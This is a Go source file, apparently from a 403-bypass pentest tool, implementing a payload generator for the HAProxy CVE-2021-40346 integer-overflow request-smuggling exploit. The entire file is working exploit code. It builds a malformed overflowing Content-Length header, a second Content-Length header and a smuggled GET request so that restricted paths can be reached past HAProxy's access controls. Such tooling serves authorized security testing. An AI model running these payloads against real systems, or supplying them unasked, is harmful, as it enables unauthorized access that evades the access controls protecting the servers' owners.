package payload

import (
	"fmt"
	"strings"

	"github.com/slicingmelon/go-rawurlparser"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
)

// https://github.com/donky16/CVE-2021-40346-POC

/*
GenerateHAProxyBypassPayloads generates payloads for exploiting the HAProxy CVE-2021-40346
integer overflow vulnerability that leads to HTTP Request Smuggling.

The vulnerability exploits an integer overflow in HAProxy's header parsing to smuggle an HTTP
request. By using a malformed Content-Length header that causes integer overflow, we can
smuggle a second request in the body of the first that will be processed by the backend server
but will bypass HAProxy's access controls.

References:
- https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/
- https://github.com/donky16/CVE-2021-40346-POC
*/
func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL: %s", targetURL)
		return allJobs
	}

	// Extract target host and path
	host := parsedURL.Host
	path := parsedURL.Path
	if parsedURL.Query != "" {
		path += "?" + parsedURL.Query
	}

	// We'll test various public endpoints before the restricted one
	// publicPaths := []string{
	// 	"/",
	// 	"/robots.txt",
	// 	"/index",
	// 	"/guest",
	// }

	publicPaths := []string{
		"/public",
		"/guest",
	}

	// Generate overflow pattern - using the exact pattern from the PoC
	// 217 'a' characters is what's used in the public exploits
	// User has indicated their specific PoC uses a header name (Content-Length0...:) that totals 271 chars,
	// implying 255 'a's after "Content-Length0".
	overflowPattern := "0" + strings.Repeat("a", 256)

	// For each public path, try to smuggle a request to the target path
	for _, publicPath := range publicPaths {
		// Craft the smuggled request
		smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nh:GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
			path, publicPath, host)

		// Properly calculate the content length dynamically for the *second* Content-Length header:
		calculatedContentLengthForSecondHeader := len(smuggledRequest)
		//calculatedContentLengthForSecondHeader := 23
		//malformedHeaderName := "Content-Length" + overflowPattern + ":"
		malformedHeaderName := "Content-Length" + overflowPattern //+ ":"
		//malformedHeaderName := "Content-Length" + overflowPattern + ":"
		// Create payload with dynamically calculated Content-Length
		// CRITICAL: The order of headers MUST be preserved exactly as specified here
		// for this exploit to work. The malformed header MUST be first, followed by
		// the regular Content-Length header.
		// job := BypassPayload{
		// 	OriginalURL:  targetURL,
		// 	Method:       "POST",
		// 	Scheme:       parsedURL.Scheme,
		// 	Host:         host,
		// 	RawURI:       publicPath,
		// 	BypassModule: bypassModule,
		// 	Body:         smuggledRequest,
		// 	Headers: []Headers{
		// 		// 1. Malformed header MUST be first - this will be processed first by HAProxy
		// 		{
		// 			Header: malformedHeaderName, // e.g., "Content-Length0...<255a's>:"
		// 			Value:  "0",                 // Empty value, to be handled by BuildRawHTTPRequest
		// 		},
		// 		// 2. Regular Content-Length MUST be second - this will be processed by backend server
		// 		{
		// 			Header: "Content-Length",
		// 			Value:  fmt.Sprintf("%d", calculatedContentLengthForSecondHeader),
		// 		},
		// 		// 3. Connection header
		// 		{
		// 			Header: "Connection",
		// 			Value:  "close",
		// 		},
		// 	},
		// }

		job := BypassPayload{
			OriginalURL:  targetURL,
			Method:       "POST",
			Scheme:       parsedURL.Scheme,
			Host:         host,
			RawURI:       publicPath,
			BypassModule: bypassModule,
			Body:         smuggledRequest,
			Headers: []Headers{
				// 1. Malformed header MUST be first - this will be processed first by HAProxy
				{
					Header: malformedHeaderName, // e.g., "Content-Length0...<255a's>:"
					Value:  "0",                 // Empty value, to be handled by BuildRawHTTPRequest
				},
				// 2. Regular Content-Length MUST be second - this will be processed by backend server
				{
					Header: "Content-Length",
					Value:  fmt.Sprintf("%d", calculatedContentLengthForSecondHeader),
				},
			},
		}

		job.PayloadToken = GeneratePayloadToken(job)
		allJobs = append(allJobs, job)
		allJobs = append(allJobs, job) // Add the same job again as per user request
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payload(s) (doubled) for %s", len(allJobs), targetURL)
	return allJobs
}
